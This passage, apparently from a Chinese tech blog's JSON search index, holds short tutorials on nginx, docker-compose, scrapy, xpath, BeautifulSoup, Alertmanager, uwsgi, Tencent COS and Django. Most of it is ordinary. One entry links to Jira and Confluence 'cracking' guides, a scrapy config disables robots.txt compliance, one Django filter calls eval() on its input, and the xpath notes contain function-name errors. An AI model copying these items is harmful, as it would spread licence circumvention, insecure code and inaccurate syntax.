如果请求头是xx-xx，需要写成$http_xx_xx ","date":"2020-11-25 14:21","objectID":"/post/2081/:0:0","tags":["nginx"],"title":"nginx添加请求头作为日志","uri":"/post/2081/"},{"categories":["docker"],"content":"官方文档 https://docs.docker.com/compose/compose-file ","date":"2020-11-24 16:25","objectID":"/post/2079/:0:0","tags":["docker"],"title":"docker-compose编排","uri":"/post/2079/"},{"categories":["docker"],"content":"编排文件版本和docker引擎版本对应关系 版本 docker版本 3.8 19.03.0+ 3.7 18.06.0+ 3.6 18.02.0+ 3.5 17.12.0+ 3.4 17.09.0+ 3.3 17.06.0+ 3.2 17.04.0+ 3.1 1.13.1+ 3.0 1.13.0+ 2.4 17.12.0+ 2.3 17.06.0+ 2.2 1.13.0+ 2.1 1.12.0+ 2.0 1.10.0+ 1.0 1.9.1.+ ","date":"2020-11-24 16:25","objectID":"/post/2079/:1:0","tags":["docker"],"title":"docker-compose编排","uri":"/post/2079/"},{"categories":["docker"],"content":"v3配置说明 version: \"3.8\" services: # 定义服务 redis: # 服务名(自定义) image: redis:alpine # 服务镜像 ports: # 定义服务所用端口和映射 - \"6379\" networks: # 定义要使用的网络 - frontend # 在下面的networks中定义的 db: # 服务名(自定义) image: postgres:9.4 # 服务镜像 volumes: # 定义持久化卷 - db-data:/var/lib/postgresql/data # 使用db-data这个卷，在下面的volumes中定义的。将容器的/var/lib/postgresql/data目录持久化到db-data这个卷中 environment: # 设置环境变量 RACK_ENV: development # 第一种写法 - RACK_ENV2=development # 第二种写法 web: # 服务名(自定义) build: ./nginx # 指定构建镜像上下文。然后运行。 nginx目录内容为Dockerfile ports: # 映射端口 - \"8000:80\" # 宿主机端口:容器端口 restart: always # 重启策略。默认on,可选always,on-failure,unless-stopped container_name: nginx-web # 容器名称 labels: # 设置标签元数据 web: true # 第一种写法 - \"web=true\" # 第一种写法 vote: # 服务名(自定义) image: dockersamples/examplevotingapp_vote:before ports: - \"5000:80\" # 宿主机端口:容器端口 networks: - frontend depends_on: # 依赖启动 - redis # 等待redis服务启动后,再启动本服务 result: # 服务名(自定义) image: dockersamples/examplevotingapp_result:before ports: - \"5001:80\" # 宿主机端口:容器端口 networks: - backend depends_on: # 依赖启动 - db # 等待db服务启动后,再启动本服务 visualizer: image: dockersamples/visualizer:stable ports: - \"8080:8080\" stop_grace_period: 1m30s # 默认情况下向容器发送SIGTERM信号(kill -15),10秒内没有停止成功就会发送SIGKILL信号(kill -9) volumes: - \"/var/run/docker.sock:/var/run/docker.sock\" # 将宿主机的/var/run/docker.sock文件挂载到容器的/var/run/docker.sock networks: frontend: # 创建网络 backend: # 创建网络 volumes: db-data: # 创建volume ","date":"2020-11-24 16:25","objectID":"/post/2079/:2:0","tags":["docker"],"title":"docker-compose编排","uri":"/post/2079/"},{"categories":["python"],"content":" import scrapy class FirstSpider(scrapy.Spider): name = 'first' # allowed_domains = ['www.soulchild.cn'] start_urls = ['http://www.qiushibaike.com/text'] def parse(self, response): div_list = response.xpath('//div[contains(@class,\"article\") and contains(@class,\"mb15\")]') all_data = [] for i in div_list: author = i.xpath('./div[@class=\"author clearfix\"]//h2/text()')[0].get() content = ''.join(i.xpath('.//div[@class=\"content\"]/span//text()').getall()) res = { \"author\": author, \"content\": content, } all_data.append(res) return all_data 将parse方法的返回值输出到本地csv文件中 scrapy crawl first -o qs.csv 支持的格式： 'json', 'jsonlines', 'jl', 'csv', 'xml', 'marshal', 'pickle' ","date":"2020-11-23 16:44","objectID":"/post/2078/:0:0","tags":["python","爬虫","scrapy"],"title":"scrapy-命令行持久化数据到本地","uri":"/post/2078/"},{"categories":["python"],"content":"1.安装 pip install scrapy ","date":"2020-11-18 09:44","objectID":"/post/2076/:1:0","tags":["python","爬虫","scrapy"],"title":"scrapy-环境安装+基本配置","uri":"/post/2076/"},{"categories":["python"],"content":"2.创建项目 scrapy startproject 项目名称 例: scrapy startproject firstBlood ","date":"2020-11-18 09:44","objectID":"/post/2076/:2:0","tags":["python","爬虫","scrapy"],"title":"scrapy-环境安装+基本配置","uri":"/post/2076/"},{"categories":["python"],"content":"2.1目录结构 firstBlood/ ├── firstBlood │ ├── __init__.py │ ├── items.py │ ├── middlewares.py │ ├── pipelines.py │ ├── settings.py │ └── spiders # 爬虫文件存放目录 │ └── __init__.py └── scrapy.cfg ","date":"2020-11-18 09:44","objectID":"/post/2076/:2:1","tags":["python","爬虫","scrapy"],"title":"scrapy-环境安装+基本配置","uri":"/post/2076/"},{"categories":["python"],"content":"3.生成爬虫文件 进入项目目录 cd firstBlood scrapy genspider 爬虫名称 起始url 例: scrapy genspider first www.soulchild.cn 创建后的文件在firstBlood/spiders/first.py目录 ","date":"2020-11-18 09:44","objectID":"/post/2076/:3:0","tags":["python","爬虫","scrapy"],"title":"scrapy-环境安装+基本配置","uri":"/post/2076/"},{"categories":["python"],"content":"4.运行爬虫 scrapy crawl 爬虫名称 例: scrapy crawl first ","date":"2020-11-18 09:44","objectID":"/post/2076/:4:0","tags":["python","爬虫","scrapy"],"title":"scrapy-环境安装+基本配置","uri":"/post/2076/"},{"categories":["python"],"content":"配置修改 settings.py USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' ROBOTSTXT_OBEY = False LOG_LEVEL = 'ERROR' ","date":"2020-11-18 09:44","objectID":"/post/2076/:5:0","tags":["python","爬虫","scrapy"],"title":"scrapy-环境安装+基本配置","uri":"/post/2076/"},{"categories":["python"],"content":"一.xpath语法 /: 根节点开始查找 //: 从任意节点开始找 .: 当前节点 ..: 上一级节点 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:0","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"属性查找 //h2[@class=\"post-title\"]: 查找class属性为xxx的h2标签 //div[@itemprop='articleBody']: 查找itemprop属性为articleBody的div标签 //h2[@class=\"post-title\"]/a: 查找class属性为post-title的h2标签，下面的所有a标签 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:1","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"获取标签的文本内容 (//h2[@class=\"post-title\"]/a)[2]/text(): 获取标签的文本内容(当前标签的文本，不包括子标签) (//h2[@class=\"post-title\"]/a)[2]//text(): 获取标签的文本内容(包括子标签) ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:2","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"获取标签的属性值 //h2[@class=\"post-title\"]/a/@href: 获取标签的属性值 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:3","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"属性+位置查找标签 (//h2[@class=\"post-title\"]/a)[2]: 第二个a标签 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:4","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"last (//h2[@class=\"post-title\"]/a)[last()]: …最后一个a标签 (//h2[@class=\"post-title\"]/a)[last()-1]: …倒数第二个a标签 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:5","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"position (//h2[@class=\"post-title\"]/a)[position()\u003e3]: 获取第三个往后的a标签 (//h2[@class=\"post-title\"]/a)[position()\u003e2][position()\u003c5]: 先从第三个开始找,再找4个标签。既获取第3-6个标签 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:6","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"contains 包含 //div[contains(@class,\"article\") and contains(@class,\"mb15\")] # 获取div的class属性中包含article和mb15的标签 //div[contains(@class,\"article\") or contains(@class,\"mb15\")] # 获取div的class属性中包含article或mb15的标签 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:7","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"以xx开头xx结尾 div[start-with(@class,'a')] # 获取div的class属性中以a开头的标签 div[ends-with(@class,'b')] # 获取div的class属性中以a结尾的标签 ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:8","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"二.python操作 #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:xpath_learn.py @time:2020/11/16 \"\"\" from lxml import etree import requests if __name__ == '__main__': # 一、加载本地html文件 # tree = etree.parse('./xxx.html') # 二、加载网络资源 headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"} resp = requests.get('https://soulchild.cn', headers=headers).content.decode('utf-8') tree = etree.HTML(resp) ele = tree.xpath('//h2[@class=\"post-title\"]/a/text()') ","date":"2020-11-16 17:23","objectID":"/post/2075/:2:0","tags":["python","爬虫"],"title":"xpath-基础","uri":"/post/2075/"},{"categories":["python"],"content":"安装模块 pip install bs4 lxml #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:bs4_learn.py @time:2020/11/16 \"\"\" from bs4 import BeautifulSoup import requests if __name__ == '__main__': # 一、加载本地html文件 # fp = open('./xxx.html', 'r', encoding='utf-8') # soup = BeautifulSoup(fp, 'lxml') # 二、加载网络资源 headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"} resp = requests.get('https://soulchild.cn', headers=headers).content.decode('utf-8') soup = BeautifulSoup(resp, 'lxml') # 查找标签################################################################################## # 打印第一个a标签 print(soup.a) # soup.xxx xxx代表html标签名 # 按照属性查找 print(soup.find('a', class_='current')) print(soup.find('a', id='logo')) print(soup.find('a', href='https://soulchild.cn/')) # 查找所有a标签 print(soup.find_all('a')) # 使用html选择器来选择标签 print('---------', soup.select('#logo')) print('---------', soup.select('.col-mb-12 h2')) #获取内容################################################################################## # 获取标签中的文本数据 print('*' * 50) print(soup.find('a', class_='current').get_text()) print(soup.find('a', class_='current').text) print(soup.find('a', class_='current').string) # 只能获取标签本身的文本数据,子标签的不会获取 # 获取标签的属性值 print(soup.find('a', class_='current')['href']) ","date":"2020-11-16 16:05","objectID":"/post/2074/:0:0","tags":["python"],"title":"BeautifulSoup-基础","uri":"/post/2074/"},{"categories":["监控"],"content":"1.配置文件 global: # 经过此时间后，如果尚未更新告警，则将告警声明为已恢复。(即prometheus没有向alertmanager发送告警了) resolve_timeout: 5m # 配置发送邮件信息 smtp_smarthost: 'smtp.qq.com:465' smtp_from: '742899387@qq.com' smtp_auth_username: '742899387@qq.com' smtp_auth_password: 'password' smtp_require_tls: false # 读取告警通知模板的目录。 templates: - '/etc/alertmanager/template/*.tmpl' # 所有报警都会进入到这个根路由下，可以根据根路由下的子路由设置报警分发策略 route: # 先解释一下分组，分组就是将多条告警信息聚合成一条发送，这样就不会收到连续的报警了。 # 将传入的告警按标签分组(标签在prometheus中的rules中定义)，例如： # 接收到的告警信息里面有许多具有cluster=A 和 alertname=LatencyHigh的标签，这些个告警将被分为一个组。 # # 如果不想使用分组，可以这样写group_by: [...] group_by: ['alertname', 'cluster', 'service'] # 第一组告警发送通知需要等待的时间，这种方式可以确保有足够的时间为同一分组获取多个告警，然后一起触发这个告警信息。 group_wait: 30s # 发送第一个告警后，等待\"group_interval\"发送一组新告警。 group_interval: 5m # 分组内发送相同告警的时间间隔。这里的配置是每3小时发送告警到分组中。举个例子：收到告警后，一个分组被创建，等待5分钟发送组内告警，如果后续组内的告警信息相同,这些告警会在3小时后发送，但是3小时内这些告警不会被发送。 repeat_interval: 3h # 这里先说一下，告警发送是需要指定接收器的，接收器在receivers中配置，接收器可以是email、webhook、pagerduty、wechat等等。一个接收器可以有多种发送方式。 # 指定默认的接收器 receiver: team-X-mails # 下面配置的是子路由，子路由的属性继承于根路由(即上面的配置)，在子路由中可以覆盖根路由的配置 # 下面是子路由的配置 routes: # 使用正则的方式匹配告警标签 - match_re: # 这里可以匹配出标签含有service=foo1或service=foo2或service=baz的告警 service: ^(foo1|foo2|baz)$ # 指定接收器为team-X-mails receiver: team-X-mails # 这里配置的是子路由的子路由，当满足父路由的的匹配时，这条子路由会进一步匹配出severity=critical的告警，并使用team-X-pager接收器发送告警，没有匹配到的告警会由父路由进行处理。 routes: - match: severity: critical receiver: team-X-pager # 这里也是一条子路由，会匹配出标签含有service=files的告警，并使用team-Y-mails接收器发送告警 - match: service: files receiver: team-Y-mails # 这里配置的是子路由的子路由，当满足父路由的的匹配时，这条子路由会进一步匹配出severity=critical的告警，并使用team-Y-pager接收器发送告警，没有匹配到的会由父路由进行处理。 routes: - match: severity: critical receiver: team-Y-pager # 该路由处理来自数据库服务的所有警报。如果没有团队来处理，则默认为数据库团队。 - match: # 首先匹配标签service=database service: database # 指定接收器 receiver: team-DB-pager # 根据受影响的数据库对告警进行分组 group_by: [alertname, cluster, database] routes: - match: owner: team-X receiver: team-X-pager # 告警是否继续匹配后续的同级路由节点，默认false，下面如果也可以匹配成功，会向两种接收器都发送告警信息(猜测。。。) continue: true - match: owner: team-Y receiver: team-Y-pager # 下面是关于inhibit(抑制)的配置，先说一下抑制是什么：抑制规则允许在另一个警报正在触发的情况下使一组告警静音。其实可以理解为告警依赖。比如一台数据库服务器掉电了，会导致db监控告警、网络告警等等，可以配置抑制规则如果服务器本身down了，那么其他的报警就不会被发送出来。 inhibit_rules: #下面配置的含义：当有多条告警在告警组里时，并且他们的标签alertname,cluster,service都相等，如果severity: 'critical'的告警产生了，那么就会抑制severity: 'warning'的告警。 - source_match: # 源告警(我理解是根据这个报警来抑制target_match中匹配的告警) severity: 'critical' # 标签匹配满足severity=critical的告警作为源告警 target_match: # 目标告警(被抑制的告警) severity: 'warning' # 告警必须满足标签匹配severity=warning才会被抑制。 equal: ['alertname', 'cluster', 'service'] # 必须在源告警和目标告警中具有相等值的标签才能使抑制生效。(即源告警和目标告警中这三个标签的值相等'alertname', 'cluster', 'service') # 下面配置的是接收器 receivers: # 接收器的名称、通过邮件的方式发送、 - name: 'team-X-mails' email_configs: # 发送给哪些人 - to: 'team-X+alerts@example.org' # 是否通知已解决的警报 send_resolved: true # 接收器的名称、通过邮件和pagerduty的方式发送、发送给哪些人，指定pagerduty的service_key - name: 'team-X-pager' email_configs: - to: 'team-X+alerts-critical@example.org' pagerduty_configs: - service_key: \u003cteam-X-key\u003e # 接收器的名称、通过邮件的方式发送、发送给哪些人 - name: 'team-Y-mails' email_configs: - to: 'team-Y+alerts@example.org' # 接收器的名称、通过pagerduty的方式发送、指定pagerduty的service_key - name: 'team-Y-pager' pagerduty_configs: - service_key: \u003cteam-Y-key\u003e # 一个接收器配置多种发送方式 - name: 'ops' webhook_configs: - url: 'http://prometheus-webhook-dingtalk.kube-ops.svc.cluster.local:8060/dingtalk/webhook1/send' send_resolved: true email_configs: - to: '742899387@qq.com' send_resolved: true - to: 'soulchild@soulchild.cn' send_resolved: true ","date":"2020-11-16 15:31","objectID":"/post/2073/:1:0","tags":["prometheus","alertmanager"],"title":"alertmanager配置文件详解(四)","uri":"/post/2073/"},{"categories":["监控"],"content":"2.接收器详细参数配置文档 email: https://prometheus.io/docs/alerting/latest/configuration/#email_config webhook: https://prometheus.io/docs/alerting/latest/configuration/#webhook_config wechat: https://prometheus.io/docs/alerting/latest/configuration/#wechat_config pagerduty：https://prometheus.io/docs/alerting/latest/configuration/#pagerduty_config ","date":"2020-11-16 15:31","objectID":"/post/2073/:2:0","tags":["prometheus","alertmanager"],"title":"alertmanager配置文件详解(四)","uri":"/post/2073/"},{"categories":["其他"],"content":"jira: https://wiki.shileizcc.com/confluence/display/atlassian/Jire+install+8.11.0 confluence: https://wiki.shileizcc.com/confluence/display/atlassian/Confluence+install+7.0.1 ","date":"2020-11-11 16:17","objectID":"/post/2072/:0:0","tags":[],"title":"jira\u0026amp;confluence安装破解","uri":"/post/2072/"},{"categories":["系统服务"],"content":"当nginx代理的后端服务器有301、302重定向时,我们可以通过proxy_redirect来重写Location请求头。 例如: location /test/ { proxy_pass http://127.0.0.1:8000; } 上面的配置中 访问xxx.com/test/,会被反向代理到后端的http://127.0.0.1:8000/test/ 由于http://127.0.0.1:8000/test/这个地址会重定向到http://127.0.0.1:8000/index/ 此时浏览器会跳转到http://127.0.0.1:8000/index/，127.0.0.1的地址肯定不是我们希望返回的结果。 在上面的配置中做一些修改： location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) $1; } 现在的返回结果就是xxx.com/test/index 一些其他的url转换： location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) $1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/test/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) aaa/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/test/aaa/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) /aaa/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/aaa/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) $schema://$host/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://xxx.com/index/ location /test/ { proxy_pass http://127.0.0.1:8000; proxy_redirect ~^http://127.0.0.1/(.*) http://soulchild.cn/$1; } # http://127.0.0.1:8000/index/ ==\u003e http://soulchild.cn/index/ ","date":"2020-11-05 09:04","objectID":"/post/2066/:0:0","tags":["nginx"],"title":"nginx-proxy_redirect","uri":"/post/2066/"},{"categories":["python"],"content":"1. uwsgi配置文件 [uwsgi] ;socket监听地址 socket=/tmp/app.sock ;http监听地址 ;http=127.0.0.1:8000 ;项目目录 chdir=/application/xxx ;配置wsgi接口模块文件路径,wsgi.py这个文件所在的目录名 ;wsgi-file=xxx/wsgi.py ;启动的进程数 processes=4 ;每个进程的线程数 threads=2 ;启动管理主进程 master=true ;存放主进程的pid文件 pidfile=uwsgi.pid ;后台运行,并设置一个日志文件路径 daemonize=uwsgi.log ;设置虚拟环境路径 ;virtualenv=/xxx/.virtualenvs/xxx/ ","date":"2020-11-04 14:44","objectID":"/post/2065/:1:0","tags":["nginx","django"],"title":"nginx+uwsgi部署django项目","uri":"/post/2065/"},{"categories":["python"],"content":"启动停止相关命令： 启动: uwsgi --ini uwsgi.ini 停止: uwsgi --stop uwsgi.pid 重新加载: uwsgi --reload ","date":"2020-11-04 14:44","objectID":"/post/2065/:1:1","tags":["nginx","django"],"title":"nginx+uwsgi部署django项目","uri":"/post/2065/"},{"categories":["python"],"content":"2.收集django静态文件 2.1在settings.py中添加如下配置: STATIC_ROOT = BASE_DIR / \"nginx\" 2.2收集静态文件 python3 manage.py collectstatic ","date":"2020-11-04 14:44","objectID":"/post/2065/:2:0","tags":["nginx","django"],"title":"nginx+uwsgi部署django项目","uri":"/post/2065/"},{"categories":["python"],"content":"3.配置nginx server { listen 80; server_name test.com; location / { uwsgi_pass 127.0.0.1:8000; include /etc/nginx/uwsgi_params; } # 配置静态文件目录 location /static { alias /xxxx/nginx/; } } ","date":"2020-11-04 14:44","objectID":"/post/2065/:3:0","tags":["nginx","django"],"title":"nginx+uwsgi部署django项目","uri":"/post/2065/"},{"categories":["python"],"content":"https://opensupport.alipay.com/support/helpcenter/192/201602471955?ant_source=antsupport#anchor__17 ","date":"2020-11-03 17:57","objectID":"/post/2064/:0:0","tags":["python"],"title":"支付宝验签","uri":"/post/2064/"},{"categories":["python"],"content":" yum install -y openssl-devel bzip2-devel expat-devel gdbm-devel readline-devel wget https://www.python.org/ftp/python/3.6.4/Python-3.6.4.tgz tar -zxvf Python-3.6.4.tgz cd Python-3.6.4 ./configure make make install ","date":"2020-10-29 18:36","objectID":"/post/2063/:0:0","tags":["python"],"title":"python3环境安装","uri":"/post/2063/"},{"categories":["python"],"content":" pip install -U cos-python-sdk-v5 初始化代码 # -*- coding=utf-8 # appid 已在配置中移除,请在参数 Bucket 中带上 appid。Bucket 由 BucketName-APPID 组成 # 1. 设置用户配置, 包括 secretId，secretKey 以及 Region from qcloud_cos import CosConfig from qcloud_cos import CosS3Client import sys import logging logging.basicConfig(level=logging.INFO, stream=sys.stdout) secret_id = 'COS_SECRETID' # 替换为用户的 secretId secret_key = 'COS_SECRETKEY' # 替换为用户的 secretKey region = 'ap-shanghai' # 替换为用户的 Region token = None # 使用临时密钥需要传入 Token，默认为空，可不填 scheme = 'https' # 指定使用 http/https 协议来访问 COS，默认为 https，可不填 config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token, Scheme=scheme) # 2. 获取客户端对象 client = CosS3Client(config) 桶操作 # 创建桶(\u003cbucketname\u003e-\u003cappid\u003e) response = client.create_bucket( Bucket='examplebucket-1250000000' ) # 查看桶 response = client.list_buckets() 上传对象 #### 文件流简单上传（不支持超过5G的文件，推荐使用下方高级上传接口） # 强烈建议您以二进制模式(binary mode)打开文件,否则可能会导致错误 ####################################################################################### # 字节流上传 with open('picture.jpg', 'rb') as fp: # 通过客户端对象,put_object方法上传文件 response = client.put_object( Bucket='examplebucket-1250000000', # 桶名称 Body=fp, # 上传的内容-bytes类型 Key='picture.jpg', # 桶中的文件名相对路径 EnableMD5=False # 计算md5 ) # 获取上传响应 print(response['ETag']) ####################################################################################### import requests stream = requests.get('https://cloud.tencent.com/document/product/436/7778') # 网络流将以 Transfer-Encoding:chunked 的方式传输到 COS response = client.put_object( Bucket='examplebucket-1250000000', Body=stream, Key='picture.jpg' ) print(response['ETag']) ####################################################################################### #### 高级上传接口（推荐） # 根据文件大小自动选择简单上传或分块上传，分块上传具备断点续传功能。 response = client.upload_file( Bucket='examplebucket-1250000000', # 桶名称 LocalFilePath='local.txt', # 本地文件路径 Key='picture.jpg', # 桶中的文件名相对路径 PartSize=1, # 分块下载的分块大小，默认为20MB MAXThread=10, # 分块下载的并发数量，默认为5个线程下载分块 EnableMD5=False # 计算md5 ) print(response['ETag']) ","date":"2020-10-27 11:45","objectID":"/post/2062/:0:0","tags":["python"],"title":"腾讯云cos对象存储python SDK使用","uri":"/post/2062/"},{"categories":["python"],"content":"path urlpatterns = [ path('', views.index, name=\"index\"), path('home/', views.home, name=\"home\"), # 带参数的路由url,路径转换器 # 官方文档:https://docs.djangoproject.com/zh-hans/2.2/topics/http/urls/#path-converters # int类型,\u003cint:age\u003e只会匹配整数类型 path('show/\u003cint:age\u003e/', views.show, name=\"show\"), # slug类型,只匹配数字字母下划线 path('list/\u003cslug:name\u003e/', views.list_user, name=\"list_user\"), # path类型,匹配所有内容 path('access/\u003cpath:c1\u003e/', views.access, name=\"access\"), # 直接使用参数 path('\u003cname\u003e/\u003cage\u003e', views.test2, name=\"arg\"), ] ","date":"2020-10-23 16:25","objectID":"/post/2061/:1:0","tags":["python","django"],"title":"django-路由规则","uri":"/post/2061/"},{"categories":["python"],"content":"re_path # re_path re_path(r'(?P\u003carg1\u003e^a\\d+)/(?P\u003carg2\u003e\\d{2})/', views.test1, name=\"re_arg\"), re_path(r'tel/(?P\u003cphone\u003e(^13[0-9]|14[579]|15[0-3,5-9]|16[6]|17[0135678]|18[0-9]|19[89])\\d{8})/$', views.get_phone, name=\"get_phone\"), ","date":"2020-10-23 16:25","objectID":"/post/2061/:2:0","tags":["python","django"],"title":"django-路由规则","uri":"/post/2061/"},{"categories":["python"],"content":"中文文档：https://django-redis-chs.readthedocs.io/zh_CN/latest/ ","date":"2020-10-18 18:07","objectID":"/post/2055/:0:0","tags":["python","django"],"title":"django-操作django-redis","uri":"/post/2055/"},{"categories":["python"],"content":"1.安装django-redis pip install redis django-redis ","date":"2020-10-18 18:07","objectID":"/post/2055/:1:0","tags":["python","django"],"title":"django-操作django-redis","uri":"/post/2055/"},{"categories":["python"],"content":"2.配置settings.py CACHES = { \"default\": { \"BACKEND\": \"django_redis.cache.RedisCache\", \"LOCATION\": \"redis://127.0.0.1:6379/1\", \"OPTIONS\": { \"CLIENT_CLASS\": \"django_redis.client.DefaultClient\", \"CONNECTION_POOL_KWARGS\": {\"max_connections\": 100}, \"PASSWORD\": \"\", } } } ","date":"2020-10-18 18:07","objectID":"/post/2055/:2:0","tags":["python","django"],"title":"django-操作django-redis","uri":"/post/2055/"},{"categories":["python"],"content":"3.使用 from django_redis import get_redis_connection # 从连接池获取一个连接 redis_conn = get_redis_connection('default') # 设置key redis_conn.set() # 获取key redis_conn.get() # 清除所有库的所有key redis_conn.flushall() # 清除当前库的所有key redis_conn.flushdb() ","date":"2020-10-18 18:07","objectID":"/post/2055/:3:0","tags":["python","django"],"title":"django-操作django-redis","uri":"/post/2055/"},{"categories":["python"],"content":"4.将redis做为django的session存储 修改settings.py SESSION_ENGINE = \"django.contrib.sessions.backends.cache\" SESSION_CACHE_ALIAS = \"default\" ","date":"2020-10-18 18:07","objectID":"/post/2055/:4:0","tags":["python","django"],"title":"django-操作django-redis","uri":"/post/2055/"},{"categories":["python"],"content":"django1.x的使用方法 ","date":"2020-10-14 13:08","objectID":"/post/2053/:1:0","tags":["python","django"],"title":"django-中间件","uri":"/post/2053/"},{"categories":["python"],"content":"1.在应用目录下建立middleware.py # 类名可以自定义 class TestMiddleware: \"\"\"中间件类\"\"\" # 中间件函数名是固定的 def __init__(self): \"\"\"服务重启之后，接收第一个请求时调用\"\"\" print('____init中间件____') def process_request(self, request): \"\"\"产生request的时候调用，在url匹配之前\"\"\" print('____request中间件____') def process_view(self, request, *args, **kwargs): \"\"\"url匹配后,视图函数调用前\"\"\" print('____view中间件____') def process_response(self, request, response): \"\"\"视图函数调用后，返回给客户端前调用\"\"\" return response def process_exception(self, request, exception): \"\"\"视图函数发生异常时，调用次函数\"\"\" # return HttpResponse(exception1) print('process_exception---Test1') ","date":"2020-10-14 13:08","objectID":"/post/2053/:1:1","tags":["python","django"],"title":"django-中间件","uri":"/post/2053/"},{"categories":["python"],"content":"2.注册中间件，修改settings.py,在MIDDLEWARE_CLASSES中添加如下内容 'booktest.middleware.TestMiddleware', 注意中间件加载是有顺序的,从上到下执行 ","date":"2020-10-14 13:08","objectID":"/post/2053/:1:2","tags":["python","django"],"title":"django-中间件","uri":"/post/2053/"},{"categories":["python"],"content":"django2.x以上的版本 ","date":"2020-10-14 13:08","objectID":"/post/2053/:2:0","tags":["python","django"],"title":"django-中间件","uri":"/post/2053/"},{"categories":["python"],"content":"1.在应用目录下建立middleware.py from django.utils.deprecation import MiddlewareMixin # 类名可以自定义 class TestMiddleware(MiddlewareMixin): \"\"\"中间件类\"\"\" def __init__(self, get_response): \"\"\"当 Web 服务器启动时，__init__() 只被调用一次\"\"\" super().__init__(get_response) print('____init中间件____') def process_request(self, request): \"\"\"产生request的时候调用，在url匹配之前\"\"\" print('____request中间件____') def process_view(self, request, view_fun, *args, **kwargs): \"\"\"url匹配后,视图函数调用前\"\"\" print('____view中间件____') def process_response(self, request, response): \"\"\"视图函数调用后，返回给客户端前调用\"\"\" print('____response中间件____') return response def process_exception(self, request, exception): \"\"\"视图函数发生异常时，调用次函数\"\"\" # return HttpResponse(exception1) print('process_exception---Test1') ","date":"2020-10-14 13:08","objectID":"/post/2053/:2:1","tags":["python","django"],"title":"django-中间件","uri":"/post/2053/"},{"categories":["python"],"content":"2.注册中间件，修改settings.py,在MIDDLEWARE中添加如下内容 'booktest3.middleware.TestMiddleware', 注意中间件加载是有顺序的,从上到下执行 ","date":"2020-10-14 13:08","objectID":"/post/2053/:2:2","tags":["python","django"],"title":"django-中间件","uri":"/post/2053/"},{"categories":["python"],"content":"官方文档: https://docs.djangoproject.com/zh-hans/3.1/howto/custom-template-tags/ ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:0","tags":["python","django"],"title":"django-自定义过滤器","uri":"/post/2049/"},{"categories":["python"],"content":"1.创建目录 在应用目录下，创建templatetags目录，并创建一个filters.py文件，名字自定义。 ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:1","tags":["python","django"],"title":"django-自定义过滤器","uri":"/post/2049/"},{"categories":["python"],"content":"2.编辑filters.py from django import template register = template.Library() # 无参数，模板调用时使用函数名即可,例{{ 2|mod }} @register.filter def mod(num): \"\"\"判断num是否为偶数\"\"\" return num % 2 == 0 # 为过滤器命名,模板调用的时候使用这个名字,例{{ 'OK'|my_lower }} @register.filter(name=\"my_lower\") def lower(v): \"\"\"转换为小写\"\"\" return v.lower() # 多参数的过滤器,只是举个例子 @register.filter def replace(value, arg): \"\"\"删除字符串中的字符,可以指定次数\"\"\" args = eval(arg) old = args[0] count = args[1] return value.replace(old, '', count) ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:2","tags":["python","django"],"title":"django-自定义过滤器","uri":"/post/2049/"},{"categories":["python"],"content":"3.编写模板 load: 填写的是py文件名 {% load filters %} {{ 2|mod }} {{ \"OK\"|my_lower }} {{ \"helloworld\"|replace:\"('o',1)\" }} 更多使用方法可以查看内置过滤器是怎么定义的 lib/python3.6/site-packages/django/template/defaultfilters.py ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:3","tags":["python","django"],"title":"django-自定义过滤器","uri":"/post/2049/"},{"categories":["python"],"content":"https://docs.djangoproject.com/zh-hans/3.1/ref/models/options/ 在定义模型类的时候有一些额外的选项可以使用,在模型类中定义class Meta即可： class AreaInfo(models.Model): \"\"\"地区模型类\"\"\" # 地区名称 atitle = models.CharField(max_length=20) # 关系属性, 表示当前地区的父级地区 